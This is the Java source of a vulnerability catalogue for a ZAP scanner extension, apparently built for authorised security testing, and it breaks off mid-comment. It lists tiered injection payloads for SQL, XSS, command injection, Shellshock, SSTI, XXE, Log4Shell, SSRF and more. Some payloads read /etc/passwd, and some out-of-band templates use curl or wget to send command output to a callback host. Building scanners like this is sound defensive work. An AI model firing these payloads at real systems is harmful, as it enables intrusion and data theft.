package org.zaproxy.zap.extension.hacktor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import org.parosproxy.paros.model.Model;

/**
 * Vulnerability-type catalog used to expand Hacktor beyond pure 401/403 bypassing.
 *
 * Every vulnerability class carries a set of payloads organised by novelty tier
 * ({@link Tier}): CLASSIC, RARE and NOVEL. The engine drops each payload through a
 * shared placement engine so every vulnerability type gets an effective injection
 * point — request headers (incrementally), every path segment (incrementally), the
 * root path / root query, and query parameter values.
 */
public final class VulnCatalog {

    public enum Tier {
        CLASSIC, RARE, NOVEL
    }

    /** A single payload for a vulnerability class, tagged with its novelty tier. */
    public static final class Payload {
        private final Tier tier;
        private final String payload;

        public Payload(Tier tier, String payload) {
            this.tier = tier;
            this.payload = payload;
        }

        public Tier getTier() { return tier; }
        public String getPayload() { return payload; }
    }

    /** A vulnerability class: display family, default header and query key, tiered payloads. */
    public static final class VulnClass {
        private final String family;
        private final String defaultHeader;
        private final String defaultQueryKey;
        private final List<Payload> payloads;
        private List<Payload> oob;

        public VulnClass(String family, String defaultHeader, String defaultQueryKey,
                List<Payload> payloads) {
            this.family = family;
            this.defaultHeader = defaultHeader;
            this.defaultQueryKey = defaultQueryKey;
            this.payloads = payloads;
            this.oob = null;
        }

        public String getFamily() { return family; }
        public String getDefaultHeader() { return defaultHeader; }
        public String getDefaultQueryKey() { return defaultQueryKey; }
        public List<Payload> getPayloads() { return payloads; }

        /**
         * Registers out-of-band probe templates for this class. Each template may
         * contain a {@code {{OOB}}} placeholder that is replaced with the user-configured
         * callback URL at technique-build time. Returns {@code this} for chaining.
         */
        public VulnClass oob(Payload... templates) {
            this.oob = templates == null ? null : Arrays.asList(templates);
            return this;
        }

        /** Out-of-band probe templates (with the {@code {{OOB}}} placeholder), or null. */
        public List<Payload> getOob() { return oob; }
    }

    private VulnCatalog() {}

    private static Payload p(Tier tier, String payload) {
        return new Payload(tier, payload);
    }

    private static final List<VulnClass> CLASSES = buildClasses();

    private static List<VulnClass> buildClasses() {
        List<VulnClass> list = new ArrayList<>();

        // Payloads are drawn from common bypass sets and the ProjectDiscovery
        // nuclei-templates repository (helpers/payloads/*.txt and fuzzing/ templates).

        List<Payload> sql = new ArrayList<>();
        sql.add(p(Tier.CLASSIC, "1' OR '1'='1"));
        sql.add(p(Tier.CLASSIC, "' OR 1=1--"));
        sql.add(p(Tier.CLASSIC, "' OR '1'='1' --"));
        sql.add(p(Tier.CLASSIC, "1' AND '1'='1"));
        sql.add(p(Tier.CLASSIC, "' AND 1=1--"));
        sql.add(p(Tier.RARE, "1') OR ('1'='1"));
        sql.add(p(Tier.RARE, "1\" OR \"1\"=\"1"));
        sql.add(p(Tier.RARE, "1' OR 1=1#"));
        sql.add(p(Tier.RARE, "admin'--"));
        sql.add(p(Tier.NOVEL, "1' UNION SELECT NULL--"));
        sql.add(p(Tier.NOVEL, "1'/*!50000OR*/1=1--"));
        sql.add(p(Tier.NOVEL, "1'||(SELECT 1)--"));
        sql.add(p(Tier.NOVEL, "' OR 1=1/*"));
        sql.add(p(Tier.NOVEL, "1' OR SLEEP(0)--"));
        list.add(new VulnClass("SQL Injection", "X-Forwarded-For", "id", sql)
            .oob(
                p(Tier.RARE, "'; EXEC xp_dirtree '\\\\{{OOB}}\\tmp';--"),
                p(Tier.RARE, "' AND LOAD_FILE('\\\\\\\\{{OOB}}\\\\x');--"),
                p(Tier.NOVEL, "'; COPY (SELECT 1) TO PROGRAM 'nslookup {{OOB}}';--")));

        List<Payload> xss = new ArrayList<>();
        xss.add(p(Tier.CLASSIC, "<script>alert(1)</script>"));
        xss.add(p(Tier.CLASSIC, "<img src=x onerror=alert(1)>"));
        xss.add(p(Tier.CLASSIC, "<svg/onload=alert(1)>"));
        xss.add(p(Tier.CLASSIC, "'\"><script>alert(1)</script>"));
        xss.add(p(Tier.CLASSIC, "<details open ontoggle=alert(1)>"));
        xss.add(p(Tier.RARE, "<iframe srcdoc=\"<script>alert(1)</script>\">"));
        xss.add(p(Tier.RARE, "<input autofocus onfocus=alert(1)>"));
        xss.add(p(Tier.RARE, "</textarea><svg/onload=alert(1)>"));
        xss.add(p(Tier.RARE, "<math><mtext></mtext><img src=x onerror=alert(1)>"));
        xss.add(p(Tier.NOVEL, "%3Cscript%3Ealert(1)%3C/script%3E"));
        xss.add(p(Tier.NOVEL, "</style><img src=x onerror=alert(1)>"));
        xss.add(p(Tier.NOVEL, "<svg><animate onbegin=alert(1)>"));
        xss.add(p(Tier.NOVEL, "javascript:alert(1)"));
        xss.add(p(Tier.NOVEL, "\"><img src=x onerror=alert(document.domain)>"));
        list.add(new VulnClass("XSS", "User-Agent", "q", xss)
            .oob(
                p(Tier.RARE, "<img src=\"{{OOB}}/x\" onerror=alert(1)>"),
                p(Tier.NOVEL, "<script src=\"{{OOB}}/x.js\"></script>")));

        // Drawn from nuclei helpers/payloads/command-injection.txt
        List<Payload> cmd = new ArrayList<>();
        cmd.add(p(Tier.CLASSIC, ";id"));
        cmd.add(p(Tier.CLASSIC, "|id"));
        cmd.add(p(Tier.CLASSIC, "&&id"));
        cmd.add(p(Tier.CLASSIC, "`id`"));
        cmd.add(p(Tier.CLASSIC, "$(id)"));
        cmd.add(p(Tier.RARE, ";netstat -a;"));
        cmd.add(p(Tier.RARE, ";system('id')"));
        cmd.add(p(Tier.RARE, "||/usr/bin/id"));
        cmd.add(p(Tier.RARE, "a);id"));
        cmd.add(p(Tier.NOVEL, "%0Aid%0A"));
        cmd.add(p(Tier.NOVEL, "$(`cat /etc/passwd`)"));
        cmd.add(p(Tier.NOVEL, "{{ get_user_file(\"/etc/passwd\") }}"));
        cmd.add(p(Tier.NOVEL, "%0Acat%20/etc/passwd"));
        cmd.add(p(Tier.NOVEL, "<!--#exec cmd=\"/usr/bin/id;-->"));
        list.add(new VulnClass("Command Injection", "X-Forwarded-For", "cmd", cmd)
            .oob(
                p(Tier.CLASSIC, ";curl {{OOB}}"),
                p(Tier.CLASSIC, ";nslookup {{OOB}}"),
                p(Tier.RARE, "`curl {{OOB}}`"),
                p(Tier.RARE, "$(curl {{OOB}}|base64)"),
                p(Tier.NOVEL, ";wget --post-data=$(id) {{OOB}}/cmd")));

        // Bash CGI Shellshock (CVE-2014-6271 / CVE-2014-7169): the HTTP header value
        // starts an environment-variable function definition that CGI exports into bash;
        // on vulnerable engines everything after "};" runs with the webserver uid.
        List<Payload> shell = new ArrayList<>();
        shell.add(p(Tier.CLASSIC, "() { :; }; /usr/bin/id"));
        shell.add(p(Tier.CLASSIC, "(){:;}; /usr/bin/id"));
        shell.add(p(Tier.CLASSIC, "() { :; }; echo; /usr/bin/id"));
        shell.add(p(Tier.CLASSIC,
            "() { :; }; echo Content-Type: text/plain; echo; /usr/bin/id"));
        shell.add(p(Tier.CLASSIC, "() { :; }; /bin/uname -a"));
        shell.add(p(Tier.RARE, "() { :; }; env"));
        shell.add(p(Tier.RARE, "() { :; }; /bin/bash -c 'echo hacked'"));
        shell.add(p(Tier.RARE, "() { :; }; /usr/bin/wget -qO- http://127.0.0.1/SSRFCHK"));
        shell.add(p(Tier.RARE, "() { :; }; /usr/bin/ping -c 3 127.0.0.1"));
        shell.add(p(Tier.RARE, "%0d%0a() { :; }; /usr/bin/id"));
        shell.add(p(Tier.NOVEL, "() { :; }; ${IFS}/usr/bin/id"));
        shell.add(p(Tier.NOVEL, "() { :; }; /usr/bin/env PATH=/bin:/usr/bin /usr/bin/id"));
        shell.add(p(Tier.NOVEL, "() { :; }; /usr/bin/sleep 5"));
        shell.add(p(Tier.NOVEL, "() { :;};(){:;}; /usr/bin/id"));
        shell.add(p(Tier.NOVEL, "() { :; }; /usr/bin/id;"));
        list.add(new VulnClass("Shellshock", "Referer", "id", shell)
            .oob(
                p(Tier.RARE, "() { :; }; /usr/bin/curl {{OOB}}/sh"),
                p(Tier.NOVEL, "() { :; }; /usr/bin/nslookup {{OOB}}/sh")));

        // Path traversal variants from nuclei http/fuzzing/linux-lfi-fuzzing.yaml
        List<Payload> ptrav = new ArrayList<>();
        ptrav.add(p(Tier.CLASSIC, "../../../etc/passwd"));
        ptrav.add(p(Tier.CLASSIC, "..%2f..%2f..%2fetc%2fpasswd"));
        ptrav.add(p(Tier.CLASSIC, "....//....//etc/passwd"));
        ptrav.add(p(Tier.CLASSIC, "/etc/passwd"));
        ptrav.add(p(Tier.RARE, "..%252f..%252f..%252fetc%252fpasswd"));
        ptrav.add(p(Tier.RARE, "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"));
        ptrav.add(p(Tier.RARE, "..%5c..%5c..%5cetc%5cpasswd"));
        ptrav.add(p(Tier.RARE, "..;/etc/passwd"));
        ptrav.add(p(Tier.NOVEL, "%2e%2e%2f%2e%2e%2fetc/passwd"));
        ptrav.add(p(Tier.NOVEL, "................//etc/passwd"));
        ptrav.add(p(Tier.NOVEL, "/%5C../%5C../etc/passwd"));
        ptrav.add(p(Tier.NOVEL,
            "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"));
        list.add(new VulnClass("Path Traversal", "Referer", "file", ptrav));

        List<Payload> ssrf = new ArrayList<>();
        ssrf.add(p(Tier.CLASSIC, "http://127.0.0.1/"));
        ssrf.add(p(Tier.CLASSIC, "http://localhost/"));
        ssrf.add(p(Tier.CLASSIC, "http://0.0.0.0/"));
        ssrf.add(p(Tier.CLASSIC, "http://127.0.0.1:80/"));
        ssrf.add(p(Tier.RARE, "http://2130706433/"));
        ssrf.add(p(Tier.RARE, "http://0x7f000001/"));
        ssrf.add(p(Tier.RARE, "http://[::1]/"));
        ssrf.add(p(Tier.RARE, "http://127.1/"));
        ssrf.add(p(Tier.NOVEL, "http://169.254.169.254/latest/meta-data/"));
        ssrf.add(p(Tier.NOVEL, "http://metadata.google.internal/"));
        ssrf.add(p(Tier.NOVEL, "http://[::ffff:169.254.169.254]/latest/meta-data/"));
        ssrf.add(p(Tier.NOVEL, "gopher://127.0.0.1:6379/_"));
        list.add(new VulnClass("SSRF", "X-Forwarded-For", "url", ssrf)
            .oob(
                p(Tier.CLASSIC, "{{OOB}}"),
                p(Tier.RARE, "http://{{OOB}}/probe")));

        List<Payload> ssti = new ArrayList<>();
        ssti.add(p(Tier.CLASSIC, "{{7*7}}"));
        ssti.add(p(Tier.CLASSIC, "${7*7}"));
        ssti.add(p(Tier.CLASSIC, "<%= 7*7 %>"));
        ssti.add(p(Tier.CLASSIC, "#{7*7}"));
        ssti.add(p(Tier.RARE, "*{7*7}"));
        ssti.add(p(Tier.RARE, "{{7*'7'}}"));
        ssti.add(p(Tier.RARE, "${{7*7}}"));
        ssti.add(p(Tier.NOVEL, "{{config}}"));
        ssti.add(p(Tier.NOVEL, "{{self._TemplateReference__context}}"));
        ssti.add(p(Tier.NOVEL, "${T(java.lang.Runtime)}"));
        ssti.add(p(Tier.NOVEL, "{{cycler.__init__.__globals__.os.popen('id').read()}}"));
        list.add(new VulnClass("SSTI", "User-Agent", "name", ssti)
            .oob(
                p(Tier.RARE,
                    "{{config.__class__.__init__.__globals__['os'].popen('curl {{OOB}}').read()}}"),
                p(Tier.NOVEL,
                    "${T(java.lang.Runtime).getRuntime().exec('curl {{OOB}}')}")));

        List<Payload> nosql = new ArrayList<>();
        nosql.add(p(Tier.CLASSIC, "' OR 1=1--"));
        nosql.add(p(Tier.CLASSIC, "{$ne:null}"));
        nosql.add(p(Tier.CLASSIC, "[$ne]=1"));
        nosql.add(p(Tier.CLASSIC, "' || '1'=='1"));
        nosql.add(p(Tier.RARE, "{\"$ne\":\"x\"}"));
        nosql.add(p(Tier.RARE, "' && this.password.match(/.*/)"));
        nosql.add(p(Tier.RARE, "'; return true;"));
        nosql.add(p(Tier.NOVEL, "{\"$where\":\"this.a==this.a\"}"));
        nosql.add(p(Tier.NOVEL, "{\"$where\":\"sleep(0)\"}"));
        nosql.add(p(Tier.NOVEL, "$regex=.*"));
        nosql.add(p(Tier.NOVEL, "{\"$gt\":\"\"}"));
        list.add(new VulnClass("NoSQL Injection", "X-Forwarded-For", "q", nosql)
            .oob(
                p(Tier.RARE,
                    "{\"$where\":\"function(){require('child_process').exec('curl {{OOB}}');return true;}\"}"),
                p(Tier.NOVEL, "'; return this.order.match(/.*/); require('child_process').exec('curl {{OOB}}');'")));

        List<Payload> redirect = new ArrayList<>();
        redirect.add(p(Tier.CLASSIC, "//evil.com"));
        redirect.add(p(Tier.CLASSIC, "///evil.com"));
        redirect.add(p(Tier.CLASSIC, "https://evil.com"));
        redirect.add(p(Tier.CLASSIC, "\\evil.com"));
        redirect.add(p(Tier.RARE, "/%09/evil.com"));
        redirect.add(p(Tier.RARE, "/\\evil.com@"));
        redirect.add(p(Tier.RARE, "https://evil.com/%2e%2e"));
        redirect.add(p(Tier.NOVEL, "//evil.com/%09%23"));
        redirect.add(p(Tier.NOVEL, "%00//evil.com"));
        redirect.add(p(Tier.NOVEL, "//evil.com/%2e%2e"));
        redirect.add(p(Tier.NOVEL, "javascript:alert(1)"));
        list.add(new VulnClass("Open Redirect", "Referer", "url", redirect)
            .oob(
                p(Tier.CLASSIC, "{{OOB}}"),
                p(Tier.RARE, "//{{OOB}}")));

        // XXE — file/external-DTD style payloads (nuclei xxe-poc.dtd style)
        List<Payload> xxe = new ArrayList<>();
        xxe.add(p(Tier.CLASSIC,
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"));
        xxe.add(p(Tier.CLASSIC,
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"));
        xxe.add(p(Tier.CLASSIC,
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]>"));
        xxe.add(p(Tier.RARE,
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]>"));
        xxe.add(p(Tier.RARE,
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>"));
        xxe.add(p(Tier.RARE,
            "<!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://127.0.0.1/xxe.dtd\"> %ext;]>"));
        xxe.add(p(Tier.NOVEL,
            "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20foo%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E"));
        xxe.add(p(Tier.NOVEL,
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///etc/passwd!/\">]>"));
        xxe.add(p(Tier.NOVEL,
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]>"));
        list.add(new VulnClass("XXE", "Referer", "xml", xxe)
            .oob(
                p(Tier.CLASSIC, "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{{OOB}}\">]>"),
                p(Tier.RARE,
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM \"{{OOB}}/xxe.dtd\"> %ext;]>")));

        List<Payload> ldap = new ArrayList<>();
        ldap.add(p(Tier.CLASSIC, "*"));
        ldap.add(p(Tier.CLASSIC, "*)(uid=*"));
        ldap.add(p(Tier.CLASSIC, "admin*"));
        ldap.add(p(Tier.RARE, "*)(uid=*))(|(uid=*"));
        ldap.add(p(Tier.RARE, "admin)(&(userPassword=*)"));
        ldap.add(p(Tier.RARE, "*)(|(objectClass=*"));
        ldap.add(p(Tier.NOVEL, "*)((cn=admin))(|(cn=*"));
        ldap.add(p(Tier.NOVEL, "%2a)(uid=*"));
        ldap.add(p(Tier.NOVEL, "\\2a)(uid=*"));
        list.add(new VulnClass("LDAP Injection", "X-Forwarded-For", "user", ldap));

        // Bash / Java log4j JNDI lookups (CVE-2021-44228 Log4Shell and friends).
        List<Payload> log4j = new ArrayList<>();
        log4j.add(p(Tier.CLASSIC, "${jndi:ldap://127.0.0.1/a}"));
        log4j.add(p(Tier.CLASSIC, "${jndi:dns://127.0.0.1/a}"));
        log4j.add(p(Tier.CLASSIC, "${jndi:rmi://127.0.0.1/b}"));
        log4j.add(p(Tier.CLASSIC, "${jndi:ldap://127.0.0.1/a/}${sys:java.version}"));
        log4j.add(p(Tier.CLASSIC, "${jndi:ldap://127.0.0.1/${sys:java.version}}"));
        log4j.add(p(Tier.RARE, "${${lower:j}ndi:ldap://127.0.0.1/a}"));
        log4j.add(p(Tier.RARE, "${jndi:ldap://127.0.0.1:1389/${env:USER}}"));
        log4j.add(p(Tier.RARE, "${jndi:ldap://${hostName}.127.0.0.1/a}"));
        log4j.add(p(Tier.RARE, "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/aWQ=}"));
        log4j.add(p(Tier.NOVEL, "${${::-j}ndi:ldap://127.0.0.1/a}"));
        log4j.add(p(Tier.NOVEL, "${${env:JAVA_HOME:-j}ndi:ldap://127.0.0.1/a}"));
        log4j.add(p(Tier.NOVEL, "${{jndi:ldap://127.0.0.1/a}}"));
        log4j.add(p(Tier.NOVEL, "${jndi:ldap%3a//127.0.0.1/a}"));
        log4j.add(p(Tier.NOVEL, "${jndi:ldap://127.0.0.1/${}}${lower:x}"));
        list.add(new VulnClass("Log4Shell", "X-Forwarded-For", "x", log4j)
            .oob(
                p(Tier.RARE, "${jndi:ldap://{{OOB}}/a}"),
                p(Tier.RARE, "${jndi:dns://{{OOB}}/a}"),
                p(Tier.NOVEL, "${{jndi:ldap://{{OOB}}/a}}")));

        // JavaScript prototype-pollution key delivery via merge/groom sinks.
        List<Payload> proto = new ArrayList<>();
        proto.add(p(Tier.CLASSIC, "__proto__[pe]=1"));
        proto.add(p(Tier.CLASSIC, "constructor[prototype][pe]=1"));
        proto.add(p(Tier.CLASSIC, "__proto__.pe=1"));
        proto.add(p(Tier.CLASSIC, "{\"__proto__\":{\"pe\":\"1\"}}"));
        proto.add(p(Tier.CLASSIC, "{\"constructor\":{\"prototype\":{\"pe\":\"1\"}}}"));
        proto.add(p(Tier.RARE, "constructor.prototype.pe=1"));
        proto.add(p(Tier.RARE, "__proto__[toString][pe]=1"));
        proto.add(p(Tier.RARE, "%5f%5fproto%5f%5f[pe]=1"));
        proto.add(p(Tier.RARE, "{\"__proto__\":{\"pe\":\"1\"},\"a\":\"b\"}"));
        proto.add(p(Tier.NOVEL, "__proto__[\\x70\\x65]=1"));
        proto.add(p(Tier.NOVEL, "{\"constructor\":{\"prototype\":{\"0\":\"x\"}}}"));
        proto.add(p(Tier.NOVEL, "[\"__proto__\",\"pe\",\"1\"]"));
        proto.add(p(Tier.NOVEL, "{\"__proto__\": {\"polluted\": \"probe\"}}"));
        list.add(new VulnClass("Prototype Pollution", "X-Forwarded-For", "q", proto));

        // Insecure deserialization magic bytes / type-gadget markers (inference via
        // error/timing anomalies; the serialized blobs themselves are harmless).
        List<Payload> deser = new ArrayList<>();
        deser.add(p(Tier.CLASSIC, "rO0ABXQABHRlc3Q="));
        deser.add(p(Tier.CLASSIC, "O:8:\"stdClass\":0:{}"));
        deser.add(p(Tier.CLASSIC, "KGRwMApTJ3B3bicKcDEKSTEKcy4="));
        deser.add(p(Tier.CLASSIC,
            "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\"}"));
        deser.add(p(Tier.CLASSIC, "a:1:{i:0;s:4:\"test\";}"));
        deser.add(p(Tier.RARE,
            "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgARamF2YS5sYW5nLkludGVnZXIS4qE2en9bLgsIAAABAAAAAXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQu1YDcCAAB4cAAAAAE="));
        deser.add(p(Tier.RARE, "%04%08o%3A%0BObject%00"));
        deser.add(p(Tier.RARE, "AAEAAAD/////AQAAAAAAAAAEAQAAAEE="));
        deser.add(p(Tier.RARE, "800495050000000000000000"));
        deser.add(p(Tier.NOVEL, "aced0005"));
        deser.add(p(Tier.NOVEL, "%AC%ED%00%05"));
        deser.add(p(Tier.NOVEL,
            "{\"__type\":\"System.Windows.Data.ObjectDataProvider\","
            + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process\"}}"));
        deser.add(p(Tier.NOVEL, "O:8:\"stdClass\":1:{s:1:\"x\";s:1:\"y\";}"));
        deser.add(p(Tier.NOVEL, "(dp0."));
        list.add(new VulnClass("Insecure Deserialization", "Cookie", "data", deser));

        // CRLF / response-splitting injection into headers.
        List<Payload> crlf = new ArrayList<>();
        crlf.add(p(Tier.CLASSIC, "%0d%0aX-Hacktor: 1"));
        crlf.add(p(Tier.CLASSIC, "%0aX-Hacktor: 1"));
        crlf.add(p(Tier.CLASSIC, "%0d%0aSet-Cookie: hacktor=1"));
        crlf.add(p(Tier.CLASSIC, "%0d%0aLocation: /hacked"));
        crlf.add(p(Tier.CLASSIC, "%0d%0a%0d%0a<script>alert(1)</script>"));
        crlf.add(p(Tier.RARE, "%250d%250aX-Hacktor: 1"));
        crlf.add(p(Tier.RARE, "%0d%0d%0aX-Hacktor: 1"));
        crlf.add(p(Tier.RARE, "%e5%98%8d%e5%98%8aX-Hacktor: 1"));
        crlf.add(p(Tier.RARE, "%0d%0aX-A: 1%0d%0aX-B: 2"));
        crlf.add(p(Tier.RARE, "\r\nX-Hacktor: 1"));
        crlf.add(p(Tier.NOVEL, "%25250d%25250aX-Hacktor: 1"));
        crlf.add(p(Tier.NOVEL, "%00%0d%0aX-Hacktor: 1"));
        crlf.add(p(Tier.NOVEL, "http://127.0.0.1%0d%0aX-Hacktor: 1"));
        crlf.add(p(Tier.NOVEL, "%u000d%u000aX-Hacktor: 1"));
        crlf.add(p(Tier.NOVEL, "%0d%0aContent-Length: 0"));
        list.add(new VulnClass("CRLF Injection", "Referer", "r", crlf));

        // Server-Side Include (SSI) directive injection.
        List<Payload> ssi = new ArrayList<>();
        ssi.add(p(Tier.CLASSIC, "<!--#exec cmd=\"/usr/bin/id\"-->"));
        ssi.add(p(Tier.CLASSIC, "<!--#include virtual=\"/etc/passwd\"-->"));
        ssi.add(p(Tier.CLASSIC, "<!--#echo var=\"DOCUMENT_ROOT\"-->"));
        ssi.add(p(Tier.CLASSIC, "<!--#exec cmd=\"env\"-->"));
        ssi.add(p(Tier.CLASSIC, "<!--#include file=\"/etc/passwd\"-->"));
        ssi.add(p(Tier.RARE, "<!--#config timefmt=\"%A %B %d\"-->"));
        ssi.add(p(Tier.RARE, "<!--#flastmod file=\"/etc/passwd\"-->"));
        ssi.add(p(Tier.RARE, "<!--#exec cmd=\"cat /etc/passwd\"-->"));
        ssi.add(p(Tier.RARE, "<!--#printenv-->"));
        ssi.add(p(Tier.NOVEL, "<!--#exec cmd=\"ls${IFS}-la\"-->"));
        ssi.add(p(Tier.NOVEL, "<!--#exec cmd=\"$(/usr/bin/id)\"-->"));
        ssi.add(p(Tier.NOVEL, "<!--#include virtual=\"cgi-bin/status\"-->"));
        ssi.add(p(Tier.NOVEL, "<!--#exec cmd=\"/usr/bin/id;#\"-->"));
        ssi.add(p(Tier.NOVEL, "<!--#include virtual=\"/proc/self/environ\"-->"));
        list.add(new VulnClass("SSI Injection", "Referer", "page", ssi)
            .oob(
                p(Tier.RARE, "<!--#exec cmd=\"curl {{OOB}}\"-->"),
                p(Tier.NOVEL, "<!--#exec cmd=\"nslookup {{OOB}}\"-->")));

        // Remote File Inclusion / URL-fed include sinks (PHP include/require, tmpl loaders).
        List<Payload> rfi = new ArrayList<>();
        rfi.add(p(Tier.CLASSIC, "http://127.0.0.1/evil.txt"));
        rfi.add(p(Tier.CLASSIC, "https://127.0.0.1/shell.php"));
        rfi.add(p(Tier.CLASSIC, "file:///etc/passwd"));
        rfi.add(p(Tier.CLASSIC, "php://filter/convert.base64-encode/resource=/etc/passwd"));
        rfi.add(p(Tier.CLASSIC, "php://input"));
        rfi.add(p(Tier.RARE, "data://text/plain;base64,PD9waHAgZWNobyAncGluZyc7"));
        rfi.add(p(Tier.RARE, "data://text/plain,<?php echo 'pwn'; ?>"));
        rfi.add(p(Tier.RARE, "expect://id"));
        rfi.add(p(Tier.RARE, "zip://archive.zip#shell.php"));
        rfi.add(p(Tier.RARE, "http://127.0.0.1%23@127.0.0.1/shell.php"));
        rfi.add(p(Tier.NOVEL, "php://filter/convert.base64-encode/resource=index"));
        rfi.add(p(Tier.NOVEL, "gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.0"));
        rfi.add(p(Tier.NOVEL, "dict://127.0.0.1:11211/set%20x%200%201%201%20v"));
        rfi.add(p(Tier.NOVEL, "jar:http://127.0.0.1/shell.jar!/"));
        list.add(new VulnClass("File Inclusion", "Referer", "file", rfi)
            .oob(
                p(Tier.CLASSIC, "{{OOB}}/x.txt"),
                p(Tier.RARE, "http://{{OOB}}/shell.txt")));

        // CSV / spreadsheet formula injection (Excel +/=-/@/tab/BOM leads).
        List<Payload> csv = new ArrayList<>();
        csv.add(p(Tier.CLASSIC, "=HYPERLINK(\"http://127.0.0.1/x\",\"pwn\")"));
        csv.add(p(Tier.CLASSIC, "=1+1"));
        csv.add(p(Tier.CLASSIC, "+cmd|'/c calc'!A0"));
        csv.add(p(Tier.CLASSIC, "-cmd|'/c calc'!A0"));
        csv.add(p(Tier.CLASSIC, "@SUM(1+1)"));
        csv.add(p(Tier.RARE, "=cmd|'/c calc'!A0"));
        csv.add(p(Tier.RARE, "=WEBSERVICE(\"http://127.0.0.1/x\")"));
        csv.add(p(Tier.RARE, "+cmd|'/c nslookup 127.0.0.1'!A0"));
        csv.add(p(Tier.RARE, "\t=1+1"));
        csv.add(p(Tier.RARE, "\n=1+1"));
        csv.add(p(Tier.NOVEL, "\uFEFF=1+1"));
        csv.add(p(Tier.NOVEL, "=WEBSERVICE(\"http://127.0.0.1/x\"&\"a\")"));
        csv.add(p(Tier.NOVEL, "=cmd|'/c copy con C:\\evil.bat'!A0"));
        csv.add(p(Tier.NOVEL, "=HYPERLINK(\"http://127.0.0.1/$(id)\",\"pwn\")"));
        list.add(new VulnClass("CSV Injection", "Referer", "x", csv)
            .oob(
                p(Tier.RARE, "=WEBSERVICE(\"{{OOB}}/csv\")"),
                p(Tier.NOVEL, "=HYPERLINK(\"{{OOB}}/$(id)\",\"x\")")));

        // Reverse-proxy / CDN trusted-header spoofing. Origins commonly trust the
        // client IP only when it arrives through the edge (XFF set, CF/Akamai IP
        // header present); when a spoofed header is honored, attackers can pass IP
        // allowlists, bypass geo/anti-DDoS/rate buckets, and reach origin-only
        // routes (admin, staging, debug) through the proxy.
        String[] ipSpoof = {
            "127.0.0.1", "::1", "0.0.0.0", "localhost", "127.0.0.2",
            "10.0.0.1", "172.16.0.1", "192.168.1.1", "169.254.169.254", "2001:db8::1",
            "999.999.999.999", "127.0.0.1, 8.8.8.8", "0x7f000001", "2130706433",
            "127.1", "[::ffff:127.0.0.1]",
        };
        Tier[] ipTier = {
            Tier.CLASSIC, Tier.CLASSIC, Tier.CLASSIC, Tier.CLASSIC, Tier.CLASSIC,
            Tier.RARE, Tier.RARE, Tier.RARE, Tier.RARE, Tier.RARE,
            Tier.NOVEL, Tier.NOVEL, Tier.NOVEL, Tier.NOVEL, Tier.NOVEL, Tier.NOVEL,
        };
        String[][] ipHeaders = {
            {"Proxy Header Trust", "X-Forwarded-For"},
            {"Cloudflare Headers", "CF-Connecting-IP"},
            {"Akamai Headers", "Akamai-X-Forwarded-For"},
            {"Real-IP Headers", "X-Real-IP"},
        };
        for (String[] ih : ipHeaders) {
            List<Payload> spoof = new ArrayList<>();
            for (int i = 0; i < ipSpoof.length; i++) {
                spoof.add(p(ipTier[i], ipSpoof[i]));
            }
            list.add(new VulnClass(ih[0], ih[1], "ip", spoof));
        }

        // RFC 7239 Forwarded header trust (for=/by=/proto=/host= assignments).
        List<Payload> fwd = new ArrayList<>();
        fwd.add(p(Tier.CLASSIC, "for=127.0.0.1"));
        fwd.add(p(Tier.CLASSIC, "for=\"[::1]\""));
        fwd.add(p(Tier.CLASSIC, "proto=http;for=127.0.0.1"));
        fwd.add(p(Tier.CLASSIC, "host=localhost;for=127.0.0.1"));
        fwd.add(p(Tier.CLASSIC, "by=\"192.0.2.60\";for=127.0.0.1"));
        fwd.add(p(Tier.RARE, "for=169.254.169.254;host=metadata"));
        fwd.add(p(Tier.RARE, "proto=https;for=127.0.0.1"));
        fwd.add(p(Tier.RARE, "for=\"[2001:db8::1]\";by=\"203.0.113.43\""));
        fwd.add(p(Tier.RARE, "for=0.0.0.0"));
        fwd.add(p(Tier.RARE, "host=admin.internal;proto=https;for=127.0.0.1"));
        fwd.add(p(Tier.NOVEL, "for=999.999.999.999"));
        fwd.add(p(Tier.NOVEL, "for=unknown"));
        fwd.add(p(Tier.NOVEL, "for=_hidden"));
        fwd.add(p(Tier.NOVEL, "by=127.0.0.1;for=10.0.0.1"));
        list.add(new VulnClass("Forwarded Header Trust", "Forwarded", "ip", fwd));

        return Collections.unmodifiableList(list);
    }

    /** All registered vulnerability classes. */
    public static List<VulnClass> getClasses() { return CLASSES; }

    /**
     * The out-of-band callback URL configured by the user (persisted in ZAP's global
     * config under {@code hacktor.oobUrl}). Empty when unset. Read at technique-build
     * time so edits take effect without a restart.
     */
    public static String getOobUrl() {
        try {
            org.parosproxy.paros.model.OptionsParam opts =
                Model.getSingleton().getOptionsParam();
            if (opts == null) return "";
            org.apache.commons.configuration.Configuration cfg = opts.getConfig();
            return cfg == null ? "" : cfg.getString("hacktor.oobUrl", "").trim();
        } catch (Exception ex) {
            return "";
        }
    }

    /**
     * Placement kinds understood by the engine's placement engine. Display names
